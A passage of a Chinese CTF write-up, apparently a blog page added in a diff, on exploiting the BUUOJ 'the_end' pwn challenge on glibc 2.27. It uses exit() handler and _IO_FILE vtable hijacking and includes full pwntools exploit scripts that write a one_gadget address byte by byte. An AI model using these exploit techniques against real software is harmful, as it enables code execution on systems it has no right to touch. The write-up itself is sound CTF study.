+    s(p64(setbuf))
+    s(p8(ori0))
+    s(p64(setbuf+<span class="number">1</span>))
+    s(p8(ori1))
+    s(p64(setbuf+<span class="number">2</span>))
+    s(p8(ori2))
+
+    leak(<span class="string">"libc_base"</span>, libc_base)
+
+    itr()
+</code></pre>
+
+<p>打_IO_OVERFLOW的话需要缓冲区有数据，这里需要多利用一字节修改，所以不可行。</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这道题如果没开pie和RELRO可以用fini_array来打</p>
+<p>如果能多写一字节可以利用_IO_OVERFLOW，io_str_finish</p>
+<p>这道题涉及了exit()函数的调用链、较高版本的IO利用，是一道值得思考的题目</p>
+<hr>
+<h2 id="续：io-str-finish"><a href="#续：io-str-finish" class="headerlink" title="续：io_str_finish"></a>续：io_str_finish</h2><p>试试io_str_finish打，给文件打补丁，需要多写一字节来修改_IO_write_ptr指针</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111243066.png" alt="image-20240611124316929"></p>
+<p>将0x837df404修改成0x837df405</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111246252.png" alt="image-20240611124604166"></p>
+<p>2.27_3.1 patch</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111249308.png" alt="image-20240611124949226"></p>
+<p>可惜one_gadget得到的gadget都用不了，试着在libc里面找也没找到合适的gadget</p>
+<blockquote>
+<p>_IO_2_1_stdout_{</p>
+<p>​     _flag &amp;&#x3D; -1</p>
+<p>​     IO_write_base &lt; IO_write_ptr</p>
+<p>​    _IO_buf_base &#x3D; &amp;_bin_sh</p>
+<p>​    _modle &lt;&#x3D; 0</p>
+<p>​    *vtable &#x3D; &amp;_IO_str_jumps - 0x8   &#x3D;&#x3D;&gt;  __IO_overflow -&gt; _IO_finish_t</p>
+<p>​     }</p>
+<p>stdout_str_fields &#x3D; system(one_gadget)</p>
+</blockquote>
+<p>调用链： __run_exit_handlers  –&gt; __fcloseall  –&gt;  _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_OVERFLOW（_IO_finish_t）</p>
+<p>如果还有个任意地址写多字节的话往_IO_buf_base &#x3D; &amp;_bin_sh</p>
+<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">def</span> <span class="title function_">pwn1</span>():
+    dl_rtld_lock_recursive = <span class="number">0x619f60</span> + libc_base
+    dl_rtld_unlock_recursive  = <span class="number">0x619f68</span> + libc_base
+    ru(<span class="string">b&#x27; good luck ;)\n&#x27;</span>)
+    <span class="comment"># debug()</span>
+
+    s(p64(dl_rtld_unlock_recursive))
+    s(p8(ori0))
+    s(p64(dl_rtld_unlock_recursive+<span class="number">1</span>))
+    s(p8(ori1))
+    s(p64(dl_rtld_unlock_recursive+<span class="number">2</span>))
+    s(p8(ori2))
+    s(p64(dl_rtld_unlock_recursive+<span class="number">3</span>))
+    s(p8(ori3))
+    s(p64(dl_rtld_unlock_recursive+<span class="number">4</span>))
+    s(p8(ori4))
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    context.log_level = <span class="string">&#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;node5.buuoj.cn 28004&#x27;</span>
+    pwnfile = <span class="string">&#x27;./the_end_5&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span> 
+    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    libc = ELF(libc_name)
+
+    io = init(pwnfile, IPort, libc_name)
+
+    ru(<span class="string">b&#x27;0x&#x27;</span>)
+    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]
+
+    one_gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>, <span class="number">0xe569f</span>, <span class="number">0xe5858</span>, <span class="number">0xe585f</span>, <span class="number">0xe5863</span>, <span class="number">0x10a398</span>]
+    one = libc_base + one_gadget[<span class="number">7</span>]
+    ori0 = one & <span class="number">0xff</span>
+    ori1 = one>><span class="number">8</span> & <span class="number">0xff</span>
+    ori2 = one>><span class="number">16</span> & <span class="number">0xff</span>
+    ori3 = one>><span class="number">24</span> & <span class="number">0xff</span>
+    ori4 = one>><span class="number">32</span> & <span class="number">0xff</span>
+    leak(<span class="string">"one_gadget"</span>, one)
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori0))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori3))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori4))
+
+    stdout_vtable = libc_base + <span class="number">0x3ec838</span>    <span class="comment">#-->fake_vtable</span>
+    stdout_free_buffer = libc_base + <span class="number">0x3ec848</span>  <span class="comment">#-->one_gadget</span>
+    fake_vtable = libc_base + <span class="number">0x3e8360</span> - <span class="number">8</span>    <span class="comment">#&_IO_str_jumps - 8 </span>
+    stdout_IO_write_ptr = libc_base + <span class="number">0x3ec788</span>
+    
+    leak(<span class="string">"stdout_vtable"</span>, stdout_vtable)
+    leak(<span class="string">"fake_vtable"</span>, fake_vtable)
+    leak(<span class="string">"stdout_free_buffer"</span>, stdout_free_buffer)
+    
+    <span class="comment"># debug("b _IO_flush_all_lockp")</span>
+    debug(<span class="string">"b _IO_str_finish"</span>)
+    s(p64(stdout_vtable))   <span class="comment">#改stdout_vtable -> _IO_str_jumps-8, 调用_IO_OVERFLOW时会按照0x18偏移找到_IO_str_finish</span>
+    s(p8(fake_vtable&<span class="number">0xff</span>))
+    s(p64(stdout_vtable+<span class="number">1</span>))
+    s(p8(fake_vtable>><span class="number">8</span>&<span class="number">0xff</span>))
+    
+    s(p64(stdout_free_buffer))
+    s(p8(ori0))
+    s(p64(stdout_free_buffer+<span class="number">1</span>))
+    s(p8(ori1))
+    s(p64(stdout_free_buffer+<span class="number">2</span>))
+    s(p8(ori2))
+
+    s(p64(stdout_IO_write_ptr))
+    s(p8(<span class="number">0xff</span>))
+
+    itr()</code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111301650.png" alt="image-20240611130110444"></p>
+<blockquote>
+<p>libc-2.28 版本起 _IO_str_finish 不再调用 _free_buffer 而是直接是直接调用 free ，因此该方法失效。</p>
+<p>2.34以下可以利用  IO_validate_vtable 劫持程序流，自 glibc-2.24 起在调用 vtable 中的函数前会调用 IO_validate_vtable 检查 vtable 执向的 _IO_jump_t 的地址是否合法，如果如果 rtld_active 返回 true（具体看调试，因为可能存在GLRO(dl_init_all_dirs)不可写且为 NULL 的情况）则会调用 _dl_addr，最终执行 __rtld_lock_lock_recursive (GL(dl_load_lock))   2.34失效</p>
+</blockquote>
+<p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45323960/article/details/123810198?app_version=6.3.7&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22123810198%22,%22source%22:%22qq_74106326%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">linux IO_FILE 利用_io list all结构体-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/243196">exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/exit-IO/" rel="tag"># exit & IO</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/" rel="prev" title="一次性格式化字符串利用">
+                  <i class="fa fa-angle-left"></i> 一次性格式化字符串利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/06/11/IO-FILE%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" rel="next" title="_IO_FILE基础利用">
+                  _IO_FILE基础利用 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">kkkk</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">87k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">1:19</span>
+  </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
